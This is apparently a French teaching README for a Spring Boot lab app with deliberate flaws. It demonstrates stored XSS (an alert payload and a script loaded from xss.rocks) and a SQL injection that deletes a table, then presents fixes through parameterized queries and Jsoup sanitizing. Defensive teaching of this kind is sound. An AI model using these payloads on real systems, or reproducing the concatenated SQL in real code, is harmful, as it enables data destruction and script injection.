# Spring Boot Injection

On peut démarrer le serveur depuis le dossier du projet en faisant :
```
./mvnw spring-boot:run
```

On accède à l'application sur http://localhost:8080/ et on peut se connecter avec les identifiants suivants :

La page http://localhost:8080/home devrait afficher 2 éléments sur l'écran au chargement:
```
yo Coucou
yo Comment ça va?
```

L'URL http://localhost:8080/nouveau affiche un formulaire pour ajouter un élément dans la liste.

En tapant du texte dans le champ et en cliquant sur "envoyer", on peut ajouter un élément à la liste.

Retourne sur http://localhost:8080/home pour valider que les ajouts ont fonctionné.

## Injection Javascript

En visitant http://localhost:8080/nouveau, on peut aussi essayer d'envoyer du code Javascript dans le champ de texte.
```javascript
<script>alert("ALERTE TON COMPTE EST PIRATÉ APPELLE LE 555 555 5555 tout de suite")</script>
```

Puis recharge la page http://localhost:8080/home pour voir ce qui se passe.

On pourrait aussi charge un script externe en injectant :
```html
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
```

### Exercice

Essaye d'adapter l'injection Javascript pour :
- afficher un texte différent dans un popup
- afficher un message dans la console du navigateur
- naviguer vers une page tierce (ex: https://cegepmontpetit.ca)


Conclusion :  Pas trop dur d'éviter les problèmes, utilise les frameworks
qui font bien attention.

EXPLOIT envoyer <script>alert("Connard")</script>
https://stackoverflow.com/questions/8683018/jsoup-clean-without-adding-html-entities
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>


## Injection SQL

Essayons d'aller sur http://localhost:8080/nouveau et de taper directement dans le champ text:

```
DELETE FROM APPMESSAGE;
```

### Compléter la requête initiale

Le code qu'on envoie est en fait inséré par le serveur Java dans ce code:
```java
jdbcTemplate.update("INSERT INTO APPMESSAGE VALUES (NULL ,'"+message+"')");
```

Donc niveau SQL si message est `DELETE FROM APPMESSAGE;` cela donne:
```sql
INSERT INTO APPMESSAGE VALUES (NULL ,'DELETE FROM APPMESSAGE;')
```
`DELETE FROM APPMESSAGE;` n'est pas considéré comme une commande mais comme les données à insérer.

Essayons maintenant
```
'); DELETE FROM APPMESSAGE; --
```

Cela donne
```sql
INSERT INTO APPMESSAGE VALUES (NULL ,''); DELETE FROM APPMESSAGE; --')
```

Ce qui donne 2 commandes SQL :
- la première est celle prévue par le développeur : `INSERT INTO APPMESSAGE VALUES (NULL ,'')`
- la seconde est celle que l'attaquant a injecté : `DELETE FROM APPMESSAGE;` 
- `--` permet de commenter la fin de la requête pour éviter les erreurs de syntaxe

Dans quel état est la BD maintenant?

### Exercice

Essaie d'adapter l'injection SQL pour:ç
- ne pas supprimer les messages
- modifier tous les messages existant pour ton nom

### Correctif


### Pour votre carrière

Sur chaque système que vous rencontrez:
- Voir s'il y a des accès SQL direct
- Voir si du code SQL est concaténé avec des données utilisateurs non contrôlées + + +
- Si c'est le cas, proposez de migrer les cas vers des requêtes avec paramètres




# Correctifs

Dans le projet **solide** on corrigé les 2 failles.

## Correctif injection SQL

Le correctif de l'injection SQL est 
```java
jdbcTemplate.update("INSERT INTO APPMESSAGE VALUES (? ,?)", null, message);
```

SQL prévoit un mécanisme pour indiquer un paramètre dans une requête:
- chaque ? indique une valeur pas encore connue (un paramètre quoi)
- on fournit ensuite les valeurs dans l'ordre

De cette manière, il n'y a aucun moyen de confondre données utilisateur et code du développeur.

Dans votre pratique, les frameworks de BD comme EntityFramework ou JPA font également ce genre de distinction. Il faut vraiment le faire exprès pour être exposé à une injection.

## Correctif injection JS

Dans le projet solide avant l'insertion dans la BD on a nettoyé le message en utilisant Jsoup:
```java
message = Jsoup.clean(message, Whitelist.simpleText());
```

Ici on a désarmé le message avant de le rajouter dans la BD.

La plupart des solutions consistent plutôt à désarmer le code au moment du chargement comme le font la plupart des frameworks qui échappent les séquences `script` et autres pour éviter que du code soit exécuté dans la page:
- React
- Razor
- Angular
- Flutter
- etc.

La leçon essentielle est de ne pas générer ton code HTML à la main. 






